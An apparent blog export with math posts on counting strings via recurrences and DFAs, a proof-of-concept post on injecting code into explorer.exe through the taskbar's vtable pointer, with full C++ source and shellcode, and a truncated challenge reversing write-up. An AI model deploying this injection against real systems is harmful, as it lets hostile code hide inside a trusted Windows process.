[{"content":"I strongly recommend you to read Part-1 before proceeding into this section.\nNow, let\u0026rsquo;s define the same for regular expressions. And then the fun begins\n\n Given a Regular language \\(R\\), Minimal Regular Expression is the regular expression generated from the minimal DFA that accepts \\(R\\)\n For example:\nLet \\(R_0 = (a+b+ab)^\\ast, R_1 = (a+b)^\\ast \\).\n\\(R_0\\) is not Minimal since we have two distinct ways of accepting the string \\(ab\\). But \\(R_1\\) is Minimal\nLet \\({\\lbrack R \\rbrack}_n \\) denote the number of n length strings accepted by the minimal regular expression \\(R\\)\nThe following definations are valid for all Minimal Regular Expression\n\nDefn. 1   \\(R = \\alpha \\)\n  then, $$ {\\lbrack R \\rbrack}_n = \\begin{cases} 1 \u0026amp;\\text{if n = \\(\\vert \\alpha \\vert\\) } \\\\ 0 \u0026amp;\\text{otherwise} \\end{cases} \\tag{1} $$\n Proof.: This is the base case. \\(R\\) accepts \\(\\alpha\\). So, there is only one string of length \\(n \\) generated, i.e., \\(\\alpha\\)\n \nDefn. 2   \\(R = R_1 + R_2 \\)\n  then,\n$$ {\\lbrack R \\rbrack}_n = {\\lbrack R_1 \\rbrack}_n + {\\lbrack R_2 \\rbrack}_n \\tag{2} $$\n Proof.: By defination \\(R_1\\) and \\(R_2\\) there will be no common prefix except \\(\\epsilon\\), so \\(R_1\\) and \\(R_2\\) generate different strings\n \nDefn. 3   \\(R = R_1 \\cdot R_2 \\)\n  then,\n$$ {\\lbrack R \\rbrack}_n = \\sum_{\\substack{0 \\leq k \\leq n}}{{\\lbrack R_1 \\rbrack}_k \\cdot {\\lbrack R_2 \\rbrack}_{n-k}} \\tag{3} $$\n Proof.: Let \\(s\\) be one of the strings accepted by \\(R\\). Since \\(R = R_1 \\cdot R_2 \\), we can generate \\(s\\lbrack :k \\rbrack\\) from \\(R_1\\) and \\(s\\lbrack k: \\rbrack\\) from \\(R_2\\), where \\( 0 \\leq k \\leq n \\).\nLet \\(k'\\) be a value of \\(k\\) such that \\(s\\lbrack :k \\rbrack\\) is not accepted by \\(R_1\\) then \\({\\lbrack R_1 \\rbrack}_k\\) will be 0 \\(\\implies {\\lbrack R_1 \\rbrack}_{k'} \\cdot {\\lbrack R_2 \\rbrack}_{n-{k'}} = 0\\). In other words, \\(k'\\) does not contribute to \\({\\lbrack R \\rbrack}_n\\)\n \nDefn. 4   \\(R = {R}^\\ast \\)\n  then,\n$$ {\\lbrack R^\\ast \\rbrack}_n = \\begin{cases} 1 \u0026amp;\\text{if n = 0 } \\\\ \\sum_{\\substack{1 \\leq k \\leq n}}{{\\lbrack R \\rbrack}_k \\cdot {\\lbrack R^\\ast \\rbrack}_{n-k}} \u0026amp;\\text{n} \\geq 1 \\end{cases} \\tag{4} $$\n Proof.:\nFrom the defination, \\(R^\\ast = \\epsilon + R + R^2 + R^3 + \\dots = \\epsilon + R \\cdot R^\\ast \\).\nApplying (1) for \\(n = 0\\), and (3) for \\(n \\geq 1\\) we get the result.\n Example 1.  Find the recurrence for the number of strings accepted by \\({\\lparen a+bb+ccc \\rparen}^\\ast\\)\n Let \\(R = a+bb+ccc \\)\nFrom (4),\n$$ {\\lbrack R^\\ast \\rbrack}_n = {\\lbrack R \\rbrack}_1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R \\rbrack}_2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R \\rbrack}_3 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} + \\dots + {\\lbrack R \\rbrack}_{n-1} \\cdot {\\lbrack R^\\ast \\rbrack}_{1} $$\nFor \\(n \\geq 4\\), \\({\\lbrack R \\rbrack}_n = 0\\) since the maximum string length generated by \\(R\\) is \\(3\\).\n So, $$ {\\lbrack R^\\ast \\rbrack}_n = {\\lbrack R \\rbrack}_1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R \\rbrack}_2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R \\rbrack}_3 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} \\tag{eg.1.1} $$\nUsing (1), we have $${\\lbrack R \\rbrack}_1 = 1, {\\lbrack R \\rbrack}_2 = 1, {\\lbrack R \\rbrack}_3 = 1 $$\nSubstituing the values in (eg.1.1), we get,\n$$ \\begin{aligned} {\\lbrack R^\\ast \\rbrack}_n \u0026amp;= 1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + 1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + 1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} \\\\ \u0026amp;= {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R^\\ast \\rbrack}_{n-3} \\end{aligned} \\tag{eg.1.2} $$\nBase Cases:\n$$ {\\lbrack R^\\ast \\rbrack}_0 = 1 $$ $$ {\\lbrack R^\\ast \\rbrack}_1 = 1 $$ $$ {\\lbrack R^\\ast \\rbrack}_2 = 1+1 = 2 \\tag{\\texttt{\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;bb\u0026rdquo;}} $$\nSo, the solution is\n$${\\lbrack R^\\ast \\rbrack}_n = \\begin{cases} {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R^\\ast \\rbrack}_{n-3} \u0026amp;\\text{n} \\geq 3 \\\\ 1 \u0026amp;\\text{n = 0, 1} \\\\ 2 \u0026amp;\\text{n = 2} \\end{cases} \\tag{eg.1.2}$$\nExample 2.  Find the recurrence for the number of strings accepted by \\({\\lparen a+bb+cc+ddd \\rparen}^\\ast\\)\n Let \\(R = a+bb+cc+ddd \\)\nFrom (4),\n$$ {\\lbrack R^\\ast \\rbrack}_n = {\\lbrack R \\rbrack}_1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R \\rbrack}_2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R \\rbrack}_3 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} + \\dots + {\\lbrack R \\rbrack}_{n-1} \\cdot {\\lbrack R^\\ast \\rbrack}_{1} $$\nFor \\(n \\geq 4\\), \\({\\lbrack R \\rbrack}_n = 0\\) since the maximum string length generated by \\(R\\) is \\(3\\).\n So, $$ {\\lbrack R^\\ast \\rbrack}_n = {\\lbrack R \\rbrack}_1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R \\rbrack}_2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R \\rbrack}_3 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} \\tag{eg.2.1} $$\nUsing (1), we have $${\\lbrack R \\rbrack}_1 = 1, {\\lbrack R \\rbrack}_2 = 2, {\\lbrack R \\rbrack}_3 = 1 $$\nSubstituting the values in (eg.2.1), we get,\n$$ \\begin{aligned} {\\lbrack R^\\ast \\rbrack}_n \u0026amp;= 1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-1} + 2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + 1 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-3} \\\\ \u0026amp;= {\\lbrack R^\\ast \\rbrack}_{n-1} + 2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R^\\ast \\rbrack}_{n-3} \\end{aligned} \\tag{eg.1.2} $$\nBase Cases:\n$$ {\\lbrack R^\\ast \\rbrack}_0 = 1 $$ $$ {\\lbrack R^\\ast \\rbrack}_1 = 1 $$ $$ {\\lbrack R^\\ast \\rbrack}_2 = 1+1+1 = 3 \\tag{\\texttt{\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;bb\u0026rdquo;, \u0026ldquo;cc\u0026rdquo;}} $$\nSo, the solution is\n$${\\lbrack R^\\ast \\rbrack}_n = \\begin{cases} {\\lbrack R^\\ast \\rbrack}_{n-1} + 2 \\cdot {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R^\\ast \\rbrack}_{n-3} \u0026amp;\\text{n} \\geq 3 \\\\ 1 \u0026amp;\\text{n = 0, 1} \\\\ 3 \u0026amp;\\text{n = 2} \\end{cases} \\tag{eg.1.2}$$\nThat\u0026rsquo;s all for part-2. Stay tuned for the next part!\n","date":"2020-11-27T00:00:00Z","permalink":"http://localhost:1313/post/counting-strings-2/","title":"Counting Strings - Part 2"},{"content":"I strongly recommend you to read Part-1 and Part-2 before proceeding into this section.\nIn this part, we will derive a general formula for solving linear recurrences.\n Find the recurrence for the number of strings generated by the regular expression \\({\\lparen a+bb+ccc \\rparen}^\\ast\\)\n From Part-2, we have\n$${\\lbrack R^\\ast \\rbrack}_n = \\begin{cases} {\\lbrack R^\\ast \\rbrack}_{n-1} + {\\lbrack R^\\ast \\rbrack}_{n-2} + {\\lbrack R^\\ast \\rbrack}_{n-3} \u0026amp;\\text{n} \\geq 3 \\\\ 1 \u0026amp;\\text{n = 0, 1} \\\\ 2 \u0026amp;\\text{n = 2} \\end{cases} \\tag{eg.1.2}$$\nSo we have the recurrence $$r_n = r_{n-1}+r_{n-2}+r_{n-3}$$ This corresponds to the strings generated by the regular expression $${\\lparen a+bb+ccc \\rparen}^\\ast$$\nIn other words, \\(r_n \\) is equal to number of strings of length n generated by \\({\\lparen a+bb+ccc \\rparen}^\\ast\\). Now suppose we have to construct a string using \\(\\texttt{\u0026ldquo;a\u0026rdquo;}\\), \\(\\texttt{\u0026ldquo;bb\u0026rdquo;}\\), and \\(\\texttt{\u0026ldquo;ccc\u0026rdquo;}\\) only\nLet\u0026rsquo;s place \\(\\texttt{\u0026ldquo;ccc\u0026rdquo;}\\) \\(g_c\\) times, \\(\\texttt{\u0026ldquo;bb\u0026rdquo;}\\) \\(g_b\\) times and \\(\\texttt{\u0026ldquo;a\u0026rdquo;}\\) \\(g_a\\) times to make the string. We have,\n$$ n = 3 g_c + 2 g_b + g_a $$\nAnd, now we place \\(g_a\\), \\(g_b\\), and \\(g_c\\) into groups in\n$$\\sum_{\\substack{0 \\leq g_a, g_b, g_c \\leq n}}{\\binom{g_a+g_b+g_c}{g_a}\\binom{g_b+g_c}{g_b}\\binom{g_c}{g_c}}$$\nSimplifying,\n$$r_n = \\sum_{\\substack{0 \\leq g_a, g_b, g_c \\leq n}}{\\frac{(g_a+g_b+g_c)!}{g_a!\\space g_b!\\space g_c!}}$$\nGeneralization of this result is described in my article:\nGeneralization of Linear Recurrences\n","date":"2020-11-27T00:00:00Z","permalink":"http://localhost:1313/post/counting-strings-part-3/","title":"Counting Strings - Part 3"},{"content":"One day, I was solving a recurrence problem from Kenneth Rosen\u0026rsquo;s Discrete Math book.\nQuestion 1  Find the recurrence for the number of bitstrings of length n, containing no two consecutive zeros\n This is quite easy, right?\nLet \\(a_n\\) be the number of strings of length n.\n If the string starts with \\(1\\), we have \\(a_{n-1}\\) choices since there\u0026rsquo;s no restriction. If the string starts with \\(0\\), we must have \\(0\\) after it, so \\(a_{n-2}\\) choices.  And since these cases don\u0026rsquo;t overlap, we can sum them to compute \\(a_n\\)\nSo, $$a_n = a_{n-1}+a_{n-2}$$\nSweet and simple fibonacci. Here comes the fun part. The next problem.\nQuestion 2  Find a recurrence relation for the number of n-digit strings over \\(\\{0,9\\}^*\\), with an even number of zeros.\n I couldn\u0026rsquo;t construct a case easily. I thought of it, (didn\u0026rsquo;t look at the solution yet) and I got an idea -\nLet \\(e_n\\) denote the number of n-length strings with even number of zeros\nLet \\(o_n\\) denote the number of n-length strings with odd number of zeros\nIf we are in \\(e_n\\)\n we are looking at \\(0\\), then we have consumed a \\(0\\) and we need to consume odd number of zeros, i.e. \\(o_{n-1}\\) we are looking at any other digit, then we consumed one digit, so we need \\(9e_{n-1}\\) for the other digits  If we are in \\(o_n\\)\n we are looking at \\(0\\), then we have consumed a \\(0\\) and we need to consume even number of zeros, i.e. \\(e_{n-1}\\) we are looking at any other digit, then we consumed one digit, so we need \\(9o_{n-1}\\) since we are still in an odd parity   So,\n$$ e_n = o_{n-1}+9e_{n-1} \\newline o_n = e_{n-1}+9o_{n-1} $$\nNow, it\u0026rsquo;s time to solve them $$ a_n = e_n+o_n = o_{n-1}+e_{n-1}+9(o_{n-1}+e_{n-1}) = 10a_{n-1} \\tag{1} $$\nAlso,\n$$ d_n = e_n-o_n = 9(e_{n-1}-o_{n-1}) - (e_{n-1}-o_{n-1}) = 8d_{n-1} \\tag{2} $$\nThe Base case:\n\\(e_1 = 9, o_1 = 1 \\implies a_1 = 10,\\space d_1 = 8 \\implies a_n = 10^n, \\space d_n = 8^n\\)\nFrom \\((1)\\) and \\((2)\\) we have, $$e_n = \\frac{10^n+8^n}{2}$$\nWhy did we construct two recurrences ? We constructed two recurrence relations since we need to count the number of zeros mod 2.\nLet\u0026rsquo;s look more closely. In the problem, we are counting strings with even number of zeros, in the alphabet \\(\\{0-9\\}^*\\). Infact, this is a regular language since we can construct a DFA to accept it.\n  DFA \nCool! Now let\u0026rsquo;s tweak this DFA a bit to count strings. Lets index each state with an integer \\(i\\) to represent the number of strings of length \\(i\\) accepted by that state.\nLet \\(s_n\\) represent number of strings of length \\(n\\) accepted by the DFA starting at state \\(s\\)\nSo,\n$$ init_n = odd_{n-1} + 9even_{n-1} \\tag{1} $$ because we have only one way to reach \\(odd\\) and \\(9\\) ways to reach \\(even\\) from \\(init\\). In either way we consume one symbol, so \\(n \\rightarrow n-1\\)\nSimilarly, $$even_n = 9even_{n-1}+odd_{n-1} \\tag{2}$$ $$odd_n = 9odd_{n-1}+even_{n-1} \\tag{3}$$\nWait! \\((2)\\) and \\((3)\\) are the recurrences we used to solve this problem. So, we can define recurrences now, but we also need the base cases.\n\\(even_0 = 1, odd_0 = init_0 = 0\\) since \\(even\\) is a final state (if we start at \\(even\\), we can accept only \\(\\epsilon\\)) whereas \\(odd\\) and \\(init\\) are non-final states.\nGeneralization To generalize this concept, we need to define some rules.\nCase 1 \n  Case 1 \nThen\n$$ A_n = B_{n-\\lvert \\alpha \\rvert} $$\nProof  In this step, we consume \\(\\alpha\\) to move from \\(A\\) to \\(B\\). So if we count n-length strings from state \\(A\\), we have to count strings of length \\(n-\\lvert \\alpha \\rvert\\) from state \\(B\\), as we are removing the prefix \\(\\alpha\\) in the transition.\n Case 2   Case 2 \nThen\n$$ A_n = B_{n-\\lvert \\alpha \\rvert} + C_{n-\\lvert \\beta \\rvert} $$\nwhere \\(\\alpha\\) and \\(\\beta\\) have no common prefix\nProof  Applying Case 1 for \\(A \\longrightarrow B\\) and \\(A \\longrightarrow C \\), we get the result. And since we are defining the rules for DFA, \\(\\alpha\\) and \\(\\beta\\) have no common prefix except \\(\\epsilon\\), so \\(B_{n-\\lvert \\alpha \\rvert}\\) and \\(C_{n-\\lvert \\beta \\rvert}\\) have no strings in common\n Case 3   Case 3 \nThen\n$$ A_n = A_{n-\\lvert \\alpha \\rvert} $$\nwhere \\(\\alpha\\) and \\(\\beta\\) have no common prefix\nProof  Applying Case 1 for \\(A \\longrightarrow A\\)\n Now let\u0026rsquo;s solve a difficult recurrence using DFA\nBase Cases $$A_0 = \\begin{cases} 1 \u0026amp;\\text{if A is final} \\\\ 0 \u0026amp;\\text{if A is non final} \\end{cases}$$\nProof  If \\(A\\) is final, we accept \\(\\epsilon\\) at \\(A\\).\n Question 3  Find a recurrence for the number of ternary strings that do not contain consecutive symbols that are same\n So, we cannot have 00, 11, and 22 as substrings.\nLet\u0026rsquo;s construct the DFA first\n  DFA for Q.3 \nNow, let\u0026rsquo;s write the recurrences\n$$ {\\lbrack\\epsilon\\rbrack}_n = {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 1\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} \\\\ {\\lbrack 0\\rbrack}_n = {\\lbrack \\phi\\rbrack}_{n-1} + {\\lbrack 1\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} \\\\ {\\lbrack 1\\rbrack}_n = {\\lbrack \\phi\\rbrack}_{n-1} + {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} \\\\ {\\lbrack 2\\rbrack}_n = {\\lbrack \\phi\\rbrack}_{n-1} + {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 1\\rbrack}_{n-1} \\\\ {\\lbrack \\phi\\rbrack}_n = {\\lbrack \\phi\\rbrack}_{n-1} + {\\lbrack \\phi\\rbrack}_{n-1} + {\\lbrack \\phi\\rbrack}_{n-1} = 3{\\lbrack\\phi\\rbrack}_{n-1} $$\n$$ {\\lbrack\\epsilon\\rbrack}_0 = {\\lbrack 0\\rbrack}_0 = {\\lbrack 1\\rbrack}_0 = {\\lbrack 2\\rbrack}_0 = 1 \\\\ {\\lbrack\\phi\\rbrack}_0 = 0 $$\nWe have \\({\\lbrack\\phi\\rbrack}_n\\ = 0\\), so we can simplify the above recurrences\n$$ {\\lbrack\\epsilon\\rbrack}_n = {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 1\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} $$ $$ \\tag{1} {\\lbrack 0\\rbrack}_n = {\\lbrack 1\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} $$ $$ \\tag{2} {\\lbrack 1\\rbrack}_n = {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 2\\rbrack}_{n-1} $$ $$ \\tag{3} {\\lbrack 2\\rbrack}_n = {\\lbrack 0\\rbrack}_{n-1} + {\\lbrack 1\\rbrack}_{n-1} $$\nAdding \\(1\\), \\(2\\) and \\(3\\), we have\n$$ {\\lbrack 012\\rbrack}_n = {\\lbrack 0\\rbrack}_n + {\\lbrack 1\\rbrack}_n + {\\lbrack 2\\rbrack}_n = 2{\\lbrack 012\\rbrack}_{n-1} = 2^{n}{\\lbrack 012\\rbrack}_0 = 3\\cdot 2^n $$\n$$ {\\lbrack\\epsilon\\rbrack}_n = {\\lbrack 012\\rbrack}_{n-1} = \\begin{cases} 1 \u0026amp;\\text{if n = 0} \\\\ 3\\cdot 2^{n-1} \u0026amp;\\text{n \u0026gt; 0} \\end{cases} $$\n Alt Proof.: We can place 0, 1, or 2 in the first place in 3 ways. And for the remaining places, we must make sure not to place the previous symbol, so, 2 ways for every other place. Implies \\(3\\cdot 2^{n-1}\\) ways in total.\n ","date":"2020-11-25T00:00:00Z","permalink":"http://localhost:1313/post/counting-strings-1/","title":"Counting Strings - Part 1"},{"content":"Description I will be describing how to inject arbritary code into explorer.exe using the Taskbar.\nI was looking in the taskbar MSTaskListWClass, and I found a valid pointer in the \u0026ldquo;Extra Window Bytes\u0026rdquo; for the \u0026ldquo;Running applications\u0026rdquo; window.\n\u0026ldquo;Running applications\u0026rdquo; window is the area just after the start button\nI attached x64dbg to explorer.exe, and voila, it\u0026rsquo;s pointing to a COM vtable.\nTo get a clear view, I opened explorer in ida (with the pdb), and here\u0026rsquo;s the vtable\nXrefs to MSTaskListWClass in ida, gives CTaskListWnd::_RegisterWindowClass(void) and CTaskListWnd::Initialize. It is important to look into _RegisterWindowClass because we want to understand the Window Callback for this class.\nHere, kernel32!GetWindowLongW returns a pointer to vtable that has three functions - AddRef, Release and WndProc. AddRef is called first, followed by the Window Procedure and Release.\nNow, this vtable is in rdata section. But the pointer to the vtable (the address stored in the extra window bytes), is writeable.\nSo, we allocate a rwx page in explorer.exe to store the shellcode and the payload and the new vtable. The new vtable is same as the existing vtable but the Release pointer points to the shellcode.\nmov rax, offset shellcode\rcall rax\rmov rax, 0xaabbccddeeff\rjmp rax\rSource Code:\n#include \u0026lt;Stdio.h\u0026gt;#include \u0026lt;windows.h\u0026gt;#include \u0026lt;TlHelp32.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;vector\u0026gt;#pragma comment(lib, \u0026#34;user32\u0026#34;)  LPCTSTR pid2name(DWORD dwPid) { static char procName[261]; HANDLE hSnapshot; PROCESSENTRY32 entry; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (Process32First(hSnapshot, \u0026amp;entry)) { do { if (entry.th32ProcessID == dwPid) { lstrcpy(procName, entry.szExeFile); return procName; } } while (Process32Next(hSnapshot, \u0026amp;entry)); } return \u0026#34;(none)\u0026#34;; } HWND g_hwndMSTaskListWClass; BOOL WINAPI EnumProc(HWND hWnd, LPARAM lP) { static char szClass[128]; GetWindowText(hWnd, szClass, 127); if (!lstrcmp(szClass, \u0026#34;Running applications\u0026#34;)) { g_hwndMSTaskListWClass = hWnd; } return TRUE; } typedef struct { UINT64 pfnAddRef; UINT64 pfnRelease; UINT64 pfnWndProc; } CImpWndProc; int main() { HWND hw = NULL; DWORD dwPid; SIZE_T nRead; HWND hwShellTray = FindWindowEx(NULL, NULL, \u0026#34;Shell_TrayWnd\u0026#34;, NULL); printf(\u0026#34;[\u0026lt;] ShellTrayWnd: %p\\n\u0026#34;, hwShellTray); EnumChildWindows(hwShellTray, EnumProc, NULL); printf(\u0026#34;[*] Running applications: %p\\n\u0026#34;, g_hwndMSTaskListWClass); GetWindowThreadProcessId(g_hwndMSTaskListWClass, \u0026amp;dwPid); printf(\u0026#34;[*] ProcessId: %d\\n\u0026#34;, pid2name(dwPid), dwPid); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); printf(\u0026#34;[*] Handle: %p\\n\u0026#34;, hProcess); auto m_windowPtr = GetWindowLongPtr(g_hwndMSTaskListWClass, 0); printf(\u0026#34;[*] VTable Ptr Ptr: %p\\n\u0026#34;, (PVOID)m_windowPtr); CImpWndProc m_vTable {}; UINT64 ptrVTable; ReadProcessMemory(hProcess, PVOID(m_windowPtr), \u0026amp;ptrVTable, sizeof ptrVTable, \u0026amp;nRead); printf(\u0026#34;[*] VTable Ptr: %p\\n\u0026#34;, PVOID(ptrVTable)); ReadProcessMemory(hProcess, PVOID(ptrVTable), \u0026amp;m_vTable, sizeof m_vTable, \u0026amp;nRead); printf(\u0026#34;[CImpWndProc.AddRef] -\u0026gt; %p\\n\u0026#34;, m_vTable.pfnAddRef); printf(\u0026#34;[CImpWndProc.Release] -\u0026gt; %p\\n\u0026#34;, m_vTable.pfnRelease); printf(\u0026#34;[CImpWndProc.WndProc] -\u0026gt; %p\\n\u0026#34;, m_vTable.pfnWndProc); // shellcode  // -------------------------  // mov rax, addr of shellcode  // call rax  // mov rax, old_release_vptr  // jmp rax  // -------------------------  const char payload[] = { 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0x05, 0x58, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x05, 0x51, 0x00, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x03, 0x7D, 0x34, 0x33, 0xC9, 0xE8, 0x0D, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21, 0x00, 0x5A, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x78, 0x30, 0x72, 0x31, 0x39, 0x78, 0x39, 0x31, 0x00, 0x41, 0x58, 0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x21, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x2C, 0x0B, 0xD3, 0xF9, 0x7F, 0x00, 0x00 }; size_t payloadSize = sizeof payload; auto vTableMem = (UINT64) VirtualAllocEx( hProcess, NULL, 32, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ); printf(\u0026#34;New VTable: %p\\n\u0026#34;, vTableMem); auto vMem = (UINT64) VirtualAllocEx( hProcess, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ); WriteProcessMemory(hProcess, PVOID(vMem), payload, payloadSize, \u0026amp;nRead); printf(\u0026#34;[*] Payload Addr: %#016lx\\n\u0026#34;, vMem); std::vector\u0026lt;uint8_t\u0026gt; shellcode; // mov rax, vMem  shellcode.push_back(uint8_t(0x48)); shellcode.push_back(uint8_t(0xb8)); for (int i = 0; i \u0026lt; 8; i++) shellcode.push_back(uint8_t(vMem \u0026gt;\u0026gt; i*8 \u0026amp; 0xff)); // call rax  shellcode.push_back(uint8_t(0xff)); shellcode.push_back(uint8_t(0xd0)); // mov rax, old_release  shellcode.push_back(uint8_t(0x48)); shellcode.push_back(uint8_t(0xb8)); for (int i = 0; i \u0026lt; 8; i++) shellcode.push_back(uint8_t(m_vTable.pfnRelease \u0026gt;\u0026gt; i*8 \u0026amp; 0xff)); // jmp rax  shellcode.push_back(uint8_t(0xff)); shellcode.push_back(uint8_t(0xe0)); printf(\u0026#34;Press Enter To Exploit!\\n\u0026#34;); char sc; sc = getchar(); auto shellcodeAddr = vMem + payloadSize + 15 \u0026amp; -16; m_vTable.pfnRelease = shellcodeAddr; printf(\u0026#34;[*] Shellcode Addr: %#016lx\\n\u0026#34;, shellcodeAddr); WriteProcessMemory(hProcess, PVOID(shellcodeAddr), shellcode.data(), shellcode.size(), \u0026amp;nRead); WriteProcessMemory(hProcess, PVOID(vTableMem), \u0026amp;m_vTable, sizeof m_vTable, \u0026amp;nRead); WriteProcessMemory(hProcess, PVOID(m_windowPtr), \u0026amp;vTableMem, sizeof vTableMem, \u0026amp;nRead); CloseHandle(hProcess); } The Payload:\n.code\rmain:\rpush rbx\rpush rcx\rpush rdx\rpush rsi\rpush rdi\rpush rbp\rpush r8\rpush r9\rpush r10\rpush r11\rpush r12\rpush r13\rpush r14\rpush r15\rmov rax, [count]\rinc qword ptr [count]\rcmp rax, 3\rjge bye\rxor ecx, ecx\rcall next\rdb \u0026quot;Hello World!\u0026quot;, 0\rnext:\rpop rdx\rcall fuck\rdb \u0026quot;x0r19x91\u0026quot;, 0\rfuck:\rpop r8\rmov r9d, 040h\rmov rax, [fnMessageBoxA]\rcall rax\rbye:\rpop r15\rpop r14\rpop r13\rpop r12\rpop r11\rpop r10\rpop r9\rpop r8\rpop rbp\rpop rdi\rpop rsi\rpop rdx\rpop rcx\rpop rbx\rret\rcount dq 0\rfnMessageBoxA dq 00007FF9D30B2CE0h ; hardcoded, just for poc, will resolve dynamically later\rend\rOutput Inspiration  modexp\u0026rsquo;s awesome blog ","date":"2020-10-06T00:00:00Z","permalink":"http://localhost:1313/post/code-injection-mstasklist/","title":"Code Injection: Windows Taskbar"},{"content":"I will be describing in detail what I did and what I should have done.\nWhat I Did Saturday Evening On Saturday evening, I started with this challenge. It\u0026rsquo;s a plain .NET executable, so I opened with dnSpy and started debugging.\nSo, this is definitely a binary written in C++/CLI.\nReading the docs for Harmony, it\u0026rsquo;s clear that the above code introduces a new prefix to the methods.\nNUFFRA -\u0026gt; FYRKANTIG, GRONKULLA -\u0026gt; RIKTIG_OGLA, SPARSAM -\u0026gt; GRUNDTAL_NORRVIKEN, FLARDFULL -\u0026gt; DAGSTORP\nwhere a -\u0026gt; b means a is executed when b is called, and then b is executed.\nNow i tried to step into \u0026lt;Module\u0026gt;.NativeGRUNDTAL_NORRVIKEN using dnSpy, but I couldn\u0026rsquo;t. Because it was pointing to unmanaged code.\nI didn\u0026rsquo;t see the RVA that dnSpy showed for this function. Following this RVA would landed me to the native code. What I did was, I opened the method body in hex editor and tried to locate the offset 0x2e90\nThe offset 0x2e90 points to the following function\nNow the fun begins here. Following the function at 0x0404961, it jumps to the address 0x600004F. Now I got stuck, since I couldn\u0026rsquo;t resolve the address, I tried to make a logical guess what the function could be.\nThe loop that iterates n times, where n is the return value of 0x0404961. So, the possibility that the function can be strlen, since we know from dnSpy that the function at 0x403a90 takes a std::string*. Checking out the xrefs of 0x0404961 we get another one in 0x4039D0, which calls the target function 0x0404961 in the same way. So, 0x0404961 being strlen has a fair possibility.\n.text:00402370 ToCustomBase64 proc near ; CODE XREF: ToCustomBase64_+22↓p .text:00402370 .text:00402370 arg_0 = byte ptr 8 .text:00402370 .text:00402370 push ebp .text:00402371 mov ebp, esp .text:00402373 mov dl, [ebp+arg_0] .text:00402376 lea ecx, [edx-30h] .text:00402379 cmp cl, 9 .text:0040237C ja short loc_402383 .text:0040237E lea eax, [edx-30h] .text:00402381 pop ebp .text:00402382 retn ; ... snip ... .text:0040239B loc_40239B: ; CODE XREF: ToCustomBase64+24↑j .text:0040239B cmp dl, 7Bh ; '{' .text:0040239E jnz short loc_4023A4 .text:004023A0 mov al, 3Eh ; '\u0026gt;' .text:004023A2 pop ebp .text:004023A3 retn .text:004023A4 ; --------------------------------------------------------------------------- .text:004023A4 .text:004023A4 loc_4023A4: ; CODE XREF: ToCustomBase64+2E↑j .text:004023A4 or eax, 0FFFFFFFFh .text:004023A7 mov ecx, 3Fh ; '?' .text:004023AC cmp dl, 7Dh ; '}' .text:004023AF cmovz eax, ecx .text:004023B2 pop ebp .text:004023B3 retn Let\u0026rsquo;s analyze this block, then the function is clear.\n.text:00402373 mov dl, [ebp+arg_0] .text:00402376 lea ecx, [edx-30h] .text:00402379 cmp cl, 9 .text:0040237C ja short loc_402383 .text:0040237E lea eax, [edx-30h] So, this function takes a char, whose address is returned by 0x00404E02, so a strong possibility of 0x00404E02 is char\u0026amp; 